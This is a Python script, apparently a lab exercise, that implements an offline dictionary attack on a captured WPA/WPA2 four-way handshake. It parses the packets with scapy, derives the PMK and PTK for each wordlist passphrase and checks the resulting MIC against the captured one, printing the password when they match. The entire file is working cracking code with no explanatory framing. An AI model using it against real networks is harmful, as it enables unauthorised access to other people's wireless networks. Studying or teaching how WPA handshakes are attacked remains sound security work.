from scapy.all import *
from binascii import a2b_hex, b2a_hex
#from pbkdf2 import pbkdf2_hex
from scapy.contrib.wpa_eapol import WPA_key

from pbkdf2 import *
import hmac, hashlib
from itertools import product
def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

if __name__ == '__main__':
    wpa = rdpcap("wpa_handshake.cap")
    f= open("wordlist")
    A = "Pairwise key expansion"
    ssid = wpa[0].info.decode("utf-8")
    APmac = a2b_hex(wpa[0].addr2.replace(":", ""))
    Clientmac       = a2b_hex(wpa[1].addr1.replace(":",""))
    ANonce = wpa[5].getlayer(WPA_key).nonce
    SNonce = raw(wpa[6])[65:-72]
    data = raw(wpa[8])[0x30:0x81] + b"\x00" * 16 + raw(wpa[8])[0x91:0x93]
    # special byte, 0x1 == md5, 0x2 == sha1
    md5 = raw(wpa[8])[0x36]

    mic_to_check = raw(wpa[8])[0x81:0x91]
    B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce,
                                                                                  SNonce)  # used in pseudo-random function

    ssid = str.encode(ssid)
    data = raw(wpa[8])[0x30:0x81] + b"\x00" * 16 + raw(wpa[8])[0x91:0x93]

    for line in f :
        #removing \r\n to the passphrase
        line = line.replace("\r","")
        line = line.replace("\n","")
        passPhrase = str.encode(line)
        pmk=b""
        # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        
        if md5 & 0x1 ==0x1:
            pmk = pbkdf2(hashlib.md5, passPhrase, ssid, 4096, 32)
        else:
            pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)
        ptk = customPRF512(pmk,str.encode(A),B)
        #use hmac to calculate mac, then compare it with the mac in the 4way handshake
        mic = hmac.new(ptk[0:16], data, hashlib.sha1)
        if a2b_hex(mic.hexdigest())[0:16] == mic_to_check:
            print("GG ! : ",line)
            break
        print("tried : ", line)
    f.close()
